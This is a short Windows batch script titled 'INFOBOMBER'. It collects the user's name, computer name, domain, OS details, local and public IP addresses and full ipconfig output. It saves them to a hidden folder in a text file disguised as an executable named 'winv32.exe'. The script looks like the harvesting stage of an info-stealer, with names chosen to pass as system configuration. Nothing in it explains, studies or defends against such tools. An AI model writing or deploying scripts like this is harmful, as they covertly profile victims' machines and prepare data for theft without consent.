@echo off
mkdir %homedrive%\%homepath%\WindowsConfigurations
echo ----------------------- Info Line ----------------------->>%homedrive%\%homepath%\WindowsConfigurations\winv32.exe
echo INFOBOMBER>>%homedrive%\%homepath%\WindowsConfigurations\winv32.exe
echo Username: %username%>>%homedrive%\%homepath%\WindowsConfigurations\winv32.exe
echo Computer Name: %computername%>>%homedrive%\%homepath%\WindowsConfigurations\winv32.exe
echo Date: %date%>>%homedrive%\%homepath%\WindowsConfigurations\winv32.exe
echo OS: %os%>>%homedrive%\%homepath%\WindowsConfigurations\winv32.exe
echo User Domain: %userdomain%>>%homedrive%\%homepath%\WindowsConfigurations\winv32.exe
echo WINDIR: %windir%>>%homedrive%\%homepath%\WindowsConfigurations\winv32.exe
echo System Root: %systemroot%>>%homedrive%\%homepath%\WindowsConfigurations\winv32.exe
echo Time: %time%>>%homedrive%\%homepath%\WindowsConfigurations\winv32.exe
echo Path to cmd: %comspec%>>%homedrive%\%homepath%\WindowsConfigurations\winv32.exe
echo Homedrive: %homedrive%>>%homedrive%\%homepath%\WindowsConfigurations\winv32.exe
echo Home Path: %homepath%>>%homedrive%\%homepath%\WindowsConfigurations\winv32.exe

for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a
echo Network IP: %NetworkIP%>>%homedrive%\%homepath%\WindowsConfigurations\winv32.exe


for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
echo Public IP: %PublicIP%>>%homedrive%\%homepath%\WindowsConfigurations\winv32.exe



echo ----------------------- Info Line ----------------------->>%homedrive%\%homepath%\WindowsConfigurations\winv32.exe

ipconfig /all>>%homedrive%\%homepath%\WindowsConfigurations\winv32.exe

exit

